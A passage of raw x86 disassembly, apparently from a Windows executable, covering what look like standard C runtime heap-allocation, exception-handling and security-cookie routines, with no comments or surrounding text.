  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
